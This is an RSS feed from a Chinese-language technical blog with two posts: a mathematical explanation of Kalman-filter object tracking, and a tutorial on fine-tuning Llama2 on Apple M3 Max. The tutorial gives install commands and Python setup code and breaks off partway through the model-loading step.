<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>singleye</title>
    <link>/</link>
    <description>singleye</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <managingEditor>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</managingEditor>
    <webMaster>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</webMaster>
    <lastBuildDate>Thu, 06 Jun 2024 09:26:40 +0800</lastBuildDate>
    
    <atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>基于 Kalman filter 的目标跟踪</title>
      <link>/2024/06/%E5%9F%BA%E4%BA%8E-kalman-filter-%E7%9A%84%E7%9B%AE%E6%A0%87%E8%B7%9F%E8%B8%AA/</link>
      <pubDate>Thu, 06 Jun 2024 09:26:40 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2024/06/%E5%9F%BA%E4%BA%8E-kalman-filter-%E7%9A%84%E7%9B%AE%E6%A0%87%E8%B7%9F%E8%B8%AA/</guid>
      <description>&lt;!--toc--&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/MachineLearning/object_tracking_kalman_filter/demo.gif&#34; alt=&#34;demo&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;使用卡尔曼滤波进行目标跟踪的数学原理&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8%e5%8d%a1%e5%b0%94%e6%9b%bc%e6%bb%a4%e6%b3%a2%e8%bf%9b%e8%a1%8c%e7%9b%ae%e6%a0%87%e8%b7%9f%e8%b8%aa%e7%9a%84%e6%95%b0%e5%ad%a6%e5%8e%9f%e7%90%86&#34;&gt;
        #
    &lt;/a&gt;
    使用卡尔曼滤波进行目标跟踪的数学原理
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;卡尔曼滤波器（Kalman Filter）是一种递归估计方法，广泛应用于目标跟踪中。其核心思想是在动态系统中利用先验信息、测量数据和系统模型来估计目标状态。卡尔曼滤波器特别适用于线性系统和高斯噪声环境。&lt;/p&gt;
&lt;h3 id=&#34;1-卡尔曼滤波的基本概念&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-%e5%8d%a1%e5%b0%94%e6%9b%bc%e6%bb%a4%e6%b3%a2%e7%9a%84%e5%9f%ba%e6%9c%ac%e6%a6%82%e5%bf%b5&#34;&gt;
        ##
    &lt;/a&gt;
    1. 卡尔曼滤波的基本概念
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;卡尔曼滤波器的工作过程可以分为两个阶段：预测（Prediction）和更新（Update）。在预测阶段，基于系统模型对下一个时刻的状态进行预测。在更新阶段，利用新的测量数据对预测结果进行修正。下面将详细介绍卡尔曼滤波器的数学原理。&lt;/p&gt;
&lt;h3 id=&#34;2-卡尔曼滤波的数学模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2-%e5%8d%a1%e5%b0%94%e6%9b%bc%e6%bb%a4%e6%b3%a2%e7%9a%84%e6%95%b0%e5%ad%a6%e6%a8%a1%e5%9e%8b&#34;&gt;
        ##
    &lt;/a&gt;
    2. 卡尔曼滤波的数学模型
&lt;/div&gt;
&lt;/h3&gt;
&lt;h4 id=&#34;21-状态方程和测量方程&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#21-%e7%8a%b6%e6%80%81%e6%96%b9%e7%a8%8b%e5%92%8c%e6%b5%8b%e9%87%8f%e6%96%b9%e7%a8%8b&#34;&gt;
        ###
    &lt;/a&gt;
    2.1 状态方程和测量方程
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;卡尔曼滤波器假设系统的状态可以用以下线性差分方程来描述：&lt;/p&gt;
$$
\[
x_k = A x_{k-1} + B u_{k-1} + w_{k-1} 
\]
$$
&lt;p&gt;其中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;\( $x_k$ \) 是系统在时刻 \( $k$ \) 的状态向量。&lt;/li&gt;
&lt;li&gt;\( $A$ \) 是状态转移矩阵，描述了系统从时刻 \( $k-1$ \) 到时刻 \( $k$ \) 的状态转移关系。&lt;/li&gt;
&lt;li&gt;\( $B$ \) 是控制输入矩阵，描述了控制输入 \( $u_{k-1}$ \) 对系统的影响。&lt;/li&gt;
&lt;li&gt;\( $w_{k-1}$ \) 是过程噪声，假设其满足高斯分布，均值为零，协方差为 \( $Q$ \)。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;测量方程描述了测量值与系统状态之间的关系：&lt;/p&gt;
$$
\[ 
z_k = H x_k + v_k 
\]
$$
&lt;p&gt;其中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;\( $z_k$ \) 是时刻 \( $k$ \) 的测量向量。&lt;/li&gt;
&lt;li&gt;\( $H$ \) 是测量矩阵，描述了系统状态到测量值的映射关系。&lt;/li&gt;
&lt;li&gt;\( $v_k$ \) 是测量噪声，假设其满足高斯分布，均值为零，协方差为 \( $R$ \)。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;22-卡尔曼滤波器的递归过程&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#22-%e5%8d%a1%e5%b0%94%e6%9b%bc%e6%bb%a4%e6%b3%a2%e5%99%a8%e7%9a%84%e9%80%92%e5%bd%92%e8%bf%87%e7%a8%8b&#34;&gt;
        ###
    &lt;/a&gt;
    2.2 卡尔曼滤波器的递归过程
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;卡尔曼滤波器的递归过程包括预测和更新两个阶段。&lt;/p&gt;
&lt;h5 id=&#34;预测阶段&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%a2%84%e6%b5%8b%e9%98%b6%e6%ae%b5&#34;&gt;
        ####
    &lt;/a&gt;
    预测阶段
&lt;/div&gt;
&lt;/h5&gt;
&lt;p&gt;在预测阶段，根据当前状态估计和控制输入，对下一时刻的状态进行预测：&lt;/p&gt;
$$ \hat{x}_{k|k-1} = A \hat{x}_{k-1|k-1} + B u_{k-1} $$
&lt;p&gt;同时，预测状态协方差：&lt;/p&gt;
$$
\[ 
P_{k|k-1} = A P_{k-1|k-1} A^T + Q 
\]
$$
&lt;h5 id=&#34;更新阶段&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%9b%b4%e6%96%b0%e9%98%b6%e6%ae%b5&#34;&gt;
        ####
    &lt;/a&gt;
    更新阶段
&lt;/div&gt;
&lt;/h5&gt;
&lt;p&gt;在更新阶段，利用新的测量数据对预测状态进行修正。首先计算卡尔曼增益：&lt;/p&gt;
$$
\[ 
K_k = P_{k|k-1} H^T (H P_{k|k-1} H^T + R)^{-1} 
\]
$$
&lt;p&gt;然后更新状态估计：&lt;/p&gt;
$$
\[ 
\hat{x}_{k|k} = \hat{x}_{k|k-1} + K_k (z_k - H \hat{x}_{k|k-1}) 
\]
$$
&lt;p&gt;最后更新状态协方差：&lt;/p&gt;
$$
\[ 
P_{k|k} = (I - K_k H) P_{k|k-1} 
\]
$$
&lt;h3 id=&#34;3-卡尔曼滤波器在目标跟踪中的应用&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3-%e5%8d%a1%e5%b0%94%e6%9b%bc%e6%bb%a4%e6%b3%a2%e5%99%a8%e5%9c%a8%e7%9b%ae%e6%a0%87%e8%b7%9f%e8%b8%aa%e4%b8%ad%e7%9a%84%e5%ba%94%e7%94%a8&#34;&gt;
        ##
    &lt;/a&gt;
    3. 卡尔曼滤波器在目标跟踪中的应用
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;在目标跟踪中，卡尔曼滤波器可以用来估计目标的位置信息（例如位置、速度）。假设目标在二维平面上运动，我们可以定义状态向量为：&lt;/p&gt;
$$
\[ 
x_k = \begin{bmatrix} x \\ y \\ a \\ h \\ v_x \\ v_y \\ v_a \\ v_h \end{bmatrix} 
\]
$$
&lt;p&gt;其中 \( x \) 和 \( y \) 是目标的框的位置，\( a \) 和 \( h \) 是目标的大小比例（如宽高比），\( $v_x$ \) 和 \( $v_y$ \) 是目标框的运动速度，\( $v_a$ \) 和 \( $v_h$ \) 是目标框的大小比例变化速度。状态转移矩阵 \( A \) 和测量矩阵 \( H \) 可以定义为：&lt;/p&gt;
&lt;h4 id=&#34;状态转移矩阵--a-&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%8a%b6%e6%80%81%e8%bd%ac%e7%a7%bb%e7%9f%a9%e9%98%b5--a-&#34;&gt;
        ###
    &lt;/a&gt;
    状态转移矩阵 \( A \)：
&lt;/div&gt;
&lt;/h4&gt;
$$
\[ 
A = \begin{matrix} 
1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 1 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 
\end{matrix} 
\]
$$
&lt;h4 id=&#34;测量矩阵--h-&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%b5%8b%e9%87%8f%e7%9f%a9%e9%98%b5--h-&#34;&gt;
        ###
    &lt;/a&gt;
    测量矩阵 \( H \)：
&lt;/div&gt;
&lt;/h4&gt;
$$
\[ 
H = \begin{bmatrix} 
1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 
\end{bmatrix} 
\]
$$
&lt;h4 id=&#34;过程噪声协方差矩阵--q-&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%bf%87%e7%a8%8b%e5%99%aa%e5%a3%b0%e5%8d%8f%e6%96%b9%e5%b7%ae%e7%9f%a9%e9%98%b5--q-&#34;&gt;
        ###
    &lt;/a&gt;
    过程噪声协方差矩阵 \( Q \):
&lt;/div&gt;
&lt;/h4&gt;
$$
\[ 
Q = \text{np.eye}(8) * 0.1 
\]
$$
&lt;h4 id=&#34;预测协方差矩阵&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%a2%84%e6%b5%8b%e5%8d%8f%e6%96%b9%e5%b7%ae%e7%9f%a9%e9%98%b5&#34;&gt;
        ###
    &lt;/a&gt;
    预测协方差矩阵：
&lt;/div&gt;
&lt;/h4&gt;
$$
\[ 
P = A P_{k-1|k-1} A^T + Q 
\]
$$
&lt;h3 id=&#34;4-实例分析&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#4-%e5%ae%9e%e4%be%8b%e5%88%86%e6%9e%90&#34;&gt;
        ##
    &lt;/a&gt;
    4. 实例分析
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;假设我们在每个时刻测量到目标的位置 \( ($x_k$, $y_k$) \)，利用上述卡尔曼滤波算法可以对目标的位置和速度进行估计和跟踪。&lt;/p&gt;
&lt;h4 id=&#34;41-初始化&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#41-%e5%88%9d%e5%a7%8b%e5%8c%96&#34;&gt;
        ###
    &lt;/a&gt;
    4.1 初始化
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;初始状态估计：&lt;/p&gt;
$$
\[ 
\hat{x}_0 = \begin{bmatrix} x_0 \\\ y_0 \\\ a_0 \\\ h_0 \\\ v_{x0} \\\ v_{y0} \\\ v_{a0} \\\ v_{h0} \end{bmatrix} 
\]
$$
&lt;p&gt;初始状态协方差：&lt;/p&gt;
$$
\[ 
P_0 = \begin{bmatrix} 
\sigma_x^2 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; \sigma_y^2 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; \sigma_a^2 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; \sigma_h^2 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; \sigma_{vx}^2 &amp; 0 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \sigma_{vy}^2 &amp; 0 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \sigma_{va}^2 &amp; 0 \\\ 
0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \sigma_{vh}^2 
\end{bmatrix} 
\]
$$
&lt;h4 id=&#34;42-迭代过程&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#42-%e8%bf%ad%e4%bb%a3%e8%bf%87%e7%a8%8b&#34;&gt;
        ###
    &lt;/a&gt;
    4.2 迭代过程
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;在每个时间步，通过上述预测和更新步骤迭代计算得到目标的状态估计和协方差。&lt;/p&gt;
&lt;h3 id=&#34;5-结论&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#5-%e7%bb%93%e8%ae%ba&#34;&gt;
        ##
    &lt;/a&gt;
    5. 结论
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;卡尔曼滤波器在目标跟踪中的应用非常广泛，特别是在噪声环境中具有良好的鲁棒性。通过结合系统模型和测量数据，卡尔曼滤波器能够有效地估计和跟踪目标的状态。理解其数学原理和实现细节，对于实际工程应用具有重要意义。&lt;/p&gt;
&lt;p&gt;代码： &lt;a href=&#34;https://github.com/singleye/object_tracking_kalman_filter&#34;&gt;https://github.com/singleye/object_tracking_kalman_filter&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>在 Apple silicon (M3 Max) 上对 Llama2 进行微调</title>
      <link>/2024/04/%E5%9C%A8-apple-silicon-m3-max-%E4%B8%8A%E5%AF%B9-llama2-%E8%BF%9B%E8%A1%8C%E5%BE%AE%E8%B0%83/</link>
      <pubDate>Fri, 26 Apr 2024 23:48:40 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2024/04/%E5%9C%A8-apple-silicon-m3-max-%E4%B8%8A%E5%AF%B9-llama2-%E8%BF%9B%E8%A1%8C%E5%BE%AE%E8%B0%83/</guid>
      <description>&lt;!--toc--&gt;
&lt;p&gt;参考 &lt;a href=&#34;https://www.datacamp.com/tutorial/fine-tuning-llama-2&#34;&gt;https://www.datacamp.com/tutorial/fine-tuning-llama-2&lt;/a&gt; 进行Llama2 微调训练时发现使用稳重代码无法在 Apple M3 Max 上运行起来，经过一番实验后得以顺利运行，下面把过程记录下来。&lt;/p&gt;
&lt;p&gt;相关代码： &lt;a href=&#34;https://github.com/singleye/Llama2-finetune&#34;&gt;https://github.com/singleye/Llama2-finetune&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-准备&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-%e5%87%86%e5%a4%87&#34;&gt;
        ##
    &lt;/a&gt;
    1. 准备
&lt;/div&gt;
&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip install accelerate peft bitsandbytes &lt;span style=&#34;color:#ff5c57&#34;&gt;transformers&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;==&lt;/span&gt;4.38.1 trl
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;transformers 不能使用 4.38.2 版本，否则在 M3 上会碰到下面的错误&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;RuntimeError: User specified an unsupported autocast device_type &amp;#39;mps&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;bitsandbytes 无法在 M3 上使用&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; os
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; torch
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;from&lt;/span&gt; datasets &lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; load_dataset
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;from&lt;/span&gt; transformers &lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    AutoModelForCausalLM,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    AutoTokenizer,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    BitsAndBytesConfig,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    TrainingArguments,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    pipeline,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    logging,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;from&lt;/span&gt; peft &lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; LoraConfig
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;from&lt;/span&gt; trl &lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; SFTTrainer
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;2-模型配置&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2-%e6%a8%a1%e5%9e%8b%e9%85%8d%e7%bd%ae&#34;&gt;
        ##
    &lt;/a&gt;
    2. 模型配置
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;由于国内直接从 HuggingFace 网站下载模型速度太慢，可以使用镜像站进行下载。&lt;/p&gt;
&lt;p&gt;设置环境变量 HF_ENDPOINT：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;export HF_ENDPOINT=https://hf-mirror.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载模型：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;huggingface-cli download --resume-download NousResearch/Llama-2-7b-chat-hf --local-dir Llama-2-7b-chat-hf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载数据集：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;huggingface-cli download --repo-type dataset --resume-download mlabonne/guanaco-llama2-1k --local-dir guanaco-llama2-1k
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;base_dir &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;～/Llama2-finetuning&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#78787e&#34;&gt;# Model from local directory&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;base_model &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; base_dir &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;/Llama-2-7b-chat-hf&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#78787e&#34;&gt;# Dataset from local directory&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;guanaco_dataset &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; base_dir &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;/guanaco-llama2-1k&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#78787e&#34;&gt;# Fine-tuned model&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;new_model &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;llama-2-7b-chat-guanaco&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;3-加载数据集&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3-%e5%8a%a0%e8%bd%bd%e6%95%b0%e6%8d%ae%e9%9b%86&#34;&gt;
        ##
    &lt;/a&gt;
    3. 加载数据集
&lt;/div&gt;
&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dataset &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; load_dataset(guanaco_dataset, split&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;train&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;4-qlora-4-bit-量化配置-m3-跳过&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#4-qlora-4-bit-%e9%87%8f%e5%8c%96%e9%85%8d%e7%bd%ae-m3-%e8%b7%b3%e8%bf%87&#34;&gt;
        ##
    &lt;/a&gt;
    4. QLoRA 4-bit 量化配置 (M3 跳过)
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;Paper: &lt;a href=&#34;https://arxiv.org/abs/2305.14314&#34;&gt;&amp;ldquo;QLoRA: Efficient Finetuning of Quantized LLMs&amp;rdquo;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;compute_dtype &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;getattr&lt;/span&gt;(torch, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;float16&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;quant_config &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; BitsAndBytesConfig(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    load_in_4bit&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;True&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bnb_4bit_quant_type&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;nf4&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bnb_4bit_compute_dtype&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;compute_dtype,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bnb_4bit_use_double_quant&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;False&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;5-加载模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#5-%e5%8a%a0%e8%bd%bd%e6%a8%a1%e5%9e%8b&#34;&gt;
        ##
    &lt;/a&gt;
    5. 加载模型
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;注意，由于 BitsAndBytesConfig 无法在 Apple Silicon (M3) 上使用，所以需要进行平台判断并做相应处理。由于无法使用量化方法进行处理，所以在 Apple Silicon (M3) 上需要使用更多的内存进行微调训练，在这个例子中大约使用了 75 GB 的内存。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;compute_dtype &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;getattr&lt;/span&gt;(torch, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;float16&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
